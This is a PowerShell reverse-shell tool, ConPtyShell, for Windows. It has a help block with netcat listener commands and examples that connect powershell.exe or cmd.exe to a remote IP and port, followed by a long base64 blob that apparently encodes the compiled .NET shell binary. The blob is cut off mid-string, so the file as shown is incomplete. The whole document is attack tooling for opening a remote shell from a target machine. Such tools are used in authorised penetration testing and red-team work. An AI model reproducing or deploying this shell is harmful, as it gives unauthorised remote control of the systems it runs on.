#Requires -Version 2

function Invoke-ConPtyShell2
{   
    <#
        .SYNOPSIS
            ConPtyShell - Fully Interactive Reverse Shell for Windows 
            Author: splinter_code
            License: MIT
            Source: https://github.com/antonioCoco/ConPtyShell
        
        .DESCRIPTION
            ConPtyShell - Fully interactive reverse shell for Windows
            
            Properly set the rows and cols values. You can retrieve it from
            your terminal with the command "stty size".
            
            You can avoid to set rows and cols values if you run your listener
            with the following command:
                stty raw -echo; (stty size; cat) | nc -lvnp 3001
           
            If you want to change the console size directly from powershell
            you can paste the following commands:
                $width=80
                $height=24
                $Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size ($width, $height)
                $Host.UI.RawUI.WindowSize = New-Object -TypeName System.Management.Automation.Host.Size -ArgumentList ($width, $height)
            
            
        .PARAMETER RemoteIp
            The remote ip to connect
        .PARAMETER RemotePort
            The remote port to connect
        .PARAMETER Rows
            Rows size for the console
            Default: "24"
        .PARAMETER Cols
            Cols size for the console
            Default: "80"
        .PARAMETER CommandLine
            The commandline of the process that you are going to interact
            Default: "powershell.exe"
            
        .EXAMPLE  
            PS>Invoke-ConPtyShell2 10.0.0.2 3001
            
            Description
            -----------
            Spawn a reverse shell

        .EXAMPLE
            PS>Invoke-ConPtyShell2 -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 30 -Cols 90
            
            Description
            -----------
            Spawn a reverse shell with specific rows and cols size
            
         .EXAMPLE
            PS>Invoke-ConPtyShell2 -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 30 -Cols 90 -CommandLine cmd.exe
            
            Description
            -----------
            Spawn a reverse shell (cmd.exe) with specific rows and cols size
            
    #>
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $RemoteIp,
        
        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $RemotePort,

        [Parameter()]
        [String]
        $Rows = "24",

        [Parameter()]
        [String]
        $Cols = "80",

        [Parameter()]
        [String]
        $CommandLine = "powershell.exe"
    )
    $parametersConPtyShell = @($RemoteIp, $RemotePort, $Rows, $Cols, $CommandLine)
    $ConPtyShellBase64 = "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RklMRV9TSEFSRV9XUklURQBGSUxFX0FUVFJJQlVURV9OT1JNQUwAT1BFTl9FWElTVElORwBTVERfSU5QVVRfSEFORExFAFNURF9PVVRQVVRfSEFORExFAFNURF9FUlJPUl9IQU5ETEUASW5pdGlhbGl6ZVByb2NUaHJlYWRBdHRyaWJ1dGVMaXN0AFVwZGF0ZVByb2NUaHJlYWRBdHRyaWJ1dGUAQ3JlYXRlUHJvY2VzcwBDcmVhdGVQcm9jZXNzVwBUZXJtaW5hdGVQcm9jZXNzAFdhaXRGb3JTaW5nbGVPYmplY3QAU2V0U3RkSGFuZGxlAEdldFN0ZEhhbmRsZQBDbG9zZUhhbmRsZQBDcmVhdGVQaXBlAENyZWF0ZUZpbGUAUmVhZEZpbGUAV3JpdGVGaWxlAENyZWF0ZVBzZXVkb0NvbnNvbGUAQ2xvc2VQc2V1ZG9Db25zb2xlAFNldENvbnNvbGVNb2RlAEdldENvbnNvbGVNb2RlAEdldE1vZHVsZUhhbmRsZQBHZXRQcm9jQWRkcmVzcwBTeXN0ZW0uTmV0LlNvY2tldHMAU29ja2V0AENvbm5lY3RTb2NrZXQAVHJ5UGFyc2VSb3dzQ29sc0Zyb21Tb2NrZXQAQ3JlYXRlUGlwZXMASW5pdENvbnNvbGUARW5hYmxlVmlydHVhbFRlcm1pbmFsU2VxdWVuY2VQcm9jZXNzaW5nAENyZWF0ZVBzZXVkb0NvbnNvbGVXaXRoUGlwZXMAQ29uZmlndXJlUHJvY2Vzc1RocmVhZABSdW5Qcm9jZXNzAENyZWF0ZUNoaWxkUHJvY2Vzc1dpdGhQc2V1ZG9Db25zb2xlAFRocmVhZFJlYWRQaXBlV3JpdGVTb2NrZXQAU3lzdGVtLlRocmVhZGluZwBUaHJlYWQAU3RhcnRUaHJlYWRSZWFkUGlwZVdyaXRlU29ja2V0AFRocmVhZFJlYWRTb2NrZXRXcml0ZVBpcGUAU3RhcnRUaHJlYWRSZWFkU29ja2V0V3JpdGVQaXBlAFNwYXduQ29uUHR5U2hlbGwAU3RhcnR1cEluZm8AbHBBdHRyaWJ1dGVMaXN0AGNiAGxwUmVzZXJ2ZWQAbHBEZXNrdG9wAGxwVGl0bGUAZHdYAGR3WQBkd1hTaXplAGR3WVNpemUAZHdYQ291bnRDaGFycwBkd1lDb3VudENoYXJzAGR3RmlsbEF0dHJpYnV0ZQBkd0ZsYWdzAHdTaG93V2luZG93AGNiUmVzZXJ2ZWQyAGxwUmVzZXJ2ZWQyAGhTdGRJbnB1dABoU3RkT3V0cHV0AGhTdGRFcnJvcgBoUHJvY2VzcwBoVGhyZWFkAGR3UHJvY2Vzc0lkAGR3VGhyZWFkSWQAbkxlbmd0aABscFNlY3VyaXR5RGVzY3JpcHRvcgBiSW5oZXJpdEhhbmRsZQBYAFkAaGVscABIZWxwUmVxdWlyZWQAQ2hlY2tBcmdzAERpc3BsYXlIZWxwAENoZWNrUmVtb3RlSXBBcmcAQ2hlY2tJbnQAUGFyc2VSb3dzAFBhcnNlQ29scwBQYXJzZUNvbW1hbmRMaW5lAENvblB0eVNoZWxsTWFpbgBNYWluAC5jdG9yAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBNYXJzaGFsQXNBdHRyaWJ1dGUAVW5tYW5hZ2VkVHlwZQBkd0F0dHJpYnV0ZUNvdW50AGxwU2l6ZQBhdHRyaWJ1dGUAbHBWYWx1ZQBjYlNpemUAbHBQcmV2aW91c1ZhbHVlAGxwUmV0dXJuU2l6ZQBscEFwcGxpY2F0aW9uTmFtZQBscENvbW1hbmRMaW5lAGxwUHJvY2Vzc0F0dHJpYnV0ZXMAbHBUaHJlYWRBdHRyaWJ1dGVzAGJJbmhlcml0SGFuZGxlcwBkd0NyZWF0aW9uRmxhZ3MAbHBFbnZpcm9ubWVudABscEN1cnJlbnREaXJlY3RvcnkAbHBTdGFydHVwSW5mbwBJbkF0dHJpYnV0ZQBscFByb2Nlc3NJbmZvcm1hdGlvbgBPdXRBdHRyaWJ1dGUAdUV4aXRDb2RlAGhIYW5kbGUAZHdNaWxsaXNlY29uZHMAblN0ZEhhbmRsZQBoT2JqZWN0AGhSZWFkUGlwZQBoV3JpdGVQaXBlAGxwUGlwZUF0dHJpYnV0ZXMAblNpemUAbHBGaWxlTmFtZQBkd0Rlc2lyZWRBY2Nlc3MAZHdTaGFyZU1vZGUAU2VjdXJpdHlBdHRyaWJ1dGVzAGR3Q3JlYXRpb25EaXNwb3NpdGlvbgBkd0ZsYWdzQW5kQXR0cmlidXRlcwBoVGVtcGxhdGVGaWxlAGhGaWxlAGxwQnVmZmVyAG5OdW1iZXJPZkJ5dGVzVG9SZWFkAGxwTnVtYmVyT2ZCeXRlc1JlYWQAbHBPdmVybGFwcGVkAG5OdW1iZXJPZkJ5dGVzVG9Xcml0ZQBscE51bWJlck9mQnl0ZXNXcml0dGVuAHNpemUAaElucHV0AGhPdXRwdXQAcGhQQwBoUEMAaENvbnNvbGVIYW5kbGUAbW9kZQBoYW5kbGUAbHBNb2R1bGVOYW1lAGhNb2R1bGUAcHJvY05hbWUAcmVtb3RlSXAAcmVtb3RlUG9ydABzaGVsbFNvY2tldAByb3dzAGNvbHMASW5wdXRQaXBlUmVhZABJbnB1dFBpcGVXcml0ZQBPdXRwdXRQaXBlUmVhZABPdXRwdXRQaXBlV3JpdGUAaGFuZGxlUHNldWRvQ29uc29sZQBDb25QdHlJbnB1dFBpcGVSZWFkAENvblB0eU91dHB1dFBpcGVXcml0ZQBhdHRyaWJ1dGVzAHNJbmZvRXgAY29tbWFuZExpbmUAdGhyZWFkUGFyYW1zAGhDaGlsZFByb2Nlc3MAcGFyYW0AYXJndW1lbnRzAGlwU3RyaW5nAGFyZwBhcmdzAFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBEbGxJbXBvcnRBdHRyaWJ1dGUAa2VybmVsMzIuZGxsAGtlcm5lbDMyAFN5c3RlbS5OZXQASVBBZGRyZXNzAFBhcnNlAElQRW5kUG9pbnQARW5kUG9pbnQAQWRkcmVzc0ZhbWlseQBnZXRfQWRkcmVzc0ZhbWlseQBTb2NrZXRUeXBlAFByb3RvY29sVHlwZQBDb25uZWN0AGdldF9Db25uZWN0ZWQAU3lzdGVtLlRleHQARW5jb2RpbmcAZ2V0X0FTQ0lJAEdldEJ5dGVzAFNlbmQAU2xlZXAAZ2V0X0F2YWlsYWJsZQBCeXRlAFJlY2VpdmUAR2V0U3RyaW5nAENoYXIAU3RyaW5nAFNwbGl0AFRyaW0ASW50MzIAVHJ5UGFyc2UATWFyc2hhbABTaXplT2YASW50UHRyAFplcm8ASW52YWxpZE9wZXJhdGlvbkV4Y2VwdGlvbgBvcF9FcXVhbGl0eQBHZXRMYXN0V2luMzJFcnJvcgBDb25jYXQAQWxsb2NIR2xvYmFsAGdldF9TaXplAG9wX0V4cGxpY2l0AFNvY2tldEZsYWdzAFBhcmFtZXRlcml6ZWRUaHJlYWRTdGFydABTdGFydABUb1N0cmluZwBGb3JtYXQAQ29uc29sZQBXcml0ZUxpbmUAb3BfSW5lcXVhbGl0eQBBYm9ydABTb2NrZXRTaHV0ZG93bgBTaHV0ZG93bgBDbG9zZQBTdHJ1Y3RMYXlvdXRBdHRyaWJ1dGUATGF5b3V0S2luZABTeXN0ZW0uSU8AVGV4dFdyaXRlcgBnZXRfT3V0AFdyaXRlAEVudmlyb25tZW50AEV4aXQALmNjdG9yAAAAAEENAAoAQwBvAG4AUAB0AHkAUwBoAGUAbABsACAALQAgAEAAcwBwAGwAaQBuAHQAZQByAF8AYwBvAGQAZQANAAoAAT1DAG8AdQBsAGQAIABuAG8AdAAgAGMAcgBlAGEAdABlACAAdABoAGUAIABJAG4AcAB1AHQAUABpAHAAZQAAP0MAbwB1AGwAZAAgAG4AbwB0ACAAYwByAGUAYQB0AGUAIAB0AGgAZQAgAE8AdQB0AHAAdQB0AFAAaQBwAGUAAA9DAE8ATgBPAFUAVAAkAAANQwBPAE4ASQBOACQAADVDAG8AdQBsAGQAIABuAG8AdAAgAGcAZQB0ACAAYwBvAG4AcwBvAGwAZQAgAG0AbwBkAGUAAFlDAG8AdQBsAGQAIABuAG8AdAAgAGUAbgBhAGIAbABlACAAdgBpAHIAdAB1AGEAbAAgAHQAZQByAG0AaQBuAGEAbAAgAHAAcgBvAGMAZQBzAHMAaQBuAGcAAICBQwBvAHUAbABkACAAbgBvAHQAIABjAGEAbABjAHUAbABhAHQAZQAgAHQAaABlACAAbgB1AG0AYgBlAHIAIABvAGYAIABiAHkAdABlAHMAIABmAG8AcgAgAHQAaABlACAAYQB0AHQAcgBpAGIAdQB0AGUAIABsAGkAcwB0AC4AIAAAQ0MAbwB1AGwAZAAgAG4AbwB0ACAAcwBlAHQAIAB1AHAAIABhAHQAdAByAGkAYgB1AHQAZQAgAGwAaQBzAHQALgAgAABdQwBvAHUAbABkACAAbgBvAHQAIABzAGUAdAAgAHAAcwBlAHUAZABvAGMAbwBuAHMAbwBsAGUAIAB0AGgAcgBlAGEAZAAgAGEAdAB0AHIAaQBiAHUAdABlAC4AIAAANUMAbwB1AGwAZAAgAG4AbwB0ACAAYwByAGUAYQB0AGUAIABwAHIAbwBjAGUAcwBzAC4AIAAAAQBVewAwAH0AQwBvAHUAbABkACAAbgBvAHQAIABjAG8AbgBuAGUAYwB0ACAAdABvACAAaQBwACAAewAxAH0AIABvAG4AIABwAG8AcgB0ACAAewAyAH0AADl7AHsAewBDAG8AbgBQAHQAeQBTAGgAZQBsAGwARQB4AGMAZQBwAHQAaQBvAG4AfQB9AH0ADQAKAAARawBlAHIAbgBlAGwAMwAyAAAnQwByAGUAYQB0AGUAUABzAGUAdQBkAG8AQwBvAG4AcwBvAGwAZQAAgK8NAAoAQwByAGUAYQB0AGUAUABzAGUAdQBkAG8AQwBvAG4AcwBvAGwAZQAgAGYAdQBuAGMAdABpAG8AbgAgAG4AbwB0ACAAZgBvAHUAbgBkACEAIABTAHAAYQB3AG4AaQBuAGcAIABhACAAbgBlAHQAYwBhAHQALQBsAGkAawBlACAAaQBuAHQAZQByAGEAYwB0AGkAdgBlACAAcwBoAGUAbABsAC4ALgAuAA0ACgABgJsNAAoAQwByAGUAYQB0AGUAUABzAGUAdQBkAG8AQwBvAG4AcwBvAGwAZQAgAGYAdQBuAGMAdABpAG8AbgAgAGYAbwB1AG4AZAAhACAAUwBwAGEAdwBuAGkAbgBnACAAYQAgAGYAdQBsAGwAeQAgAGkAbgB0AGUAcgBhAGMAdABpAHYAZQAgAHMAaABlAGwAbAAuAC4ALgANAAoAAGV7ADAAfQBDAG8AdQBsAGQAIABuAG8AdAAgAGMAcgBlAGEAdABlACAAcABzAHUAZQBkAG8AIABjAG8AbgBzAG8AbABlAC4AIABFAHIAcgBvAHIAIABDAG8AZABlACAAewAxAH0AADlDAG8AbgBQAHQAeQBTAGgAZQBsAGwAIABrAGkAbgBkAGwAeQAgAGUAeABpAHQAZQBkAC4ADQAKAAAFLQBoAAENLQAtAGgAZQBsAHAAAQUvAD8AAIC5DQAKAEMAbwBuAFAAdAB5AFMAaABlAGwAbAA6ACAATgBvAHQAIABlAG4AbwB1AGcAaAAgAGEAcgBnAHUAbQBlAG4AdABzAC4AIAAyACAAQQByAGcAdQBtAGUAbgB0AHMAIAByAGUAcQB1AGkAcgBlAGQALgAgAFUAcwBlACAALQAtAGgAZQBsAHAAIABmAG8AcgAgAGEAZABkAGkAdABpAG8AbgBhAGwAIABoAGUAbABwAC4ADQAKAAFXDQAKAEMAbwBuAFAAdAB5AFMAaABlAGwAbAA6ACAASQBuAHYAYQBsAGkAZAAgAHIAZQBtAG8AdABlAEkAcAAgAHYAYQBsAHUAZQAgAHsAMAB9AA0ACgAAVQ0ACgBDAG8A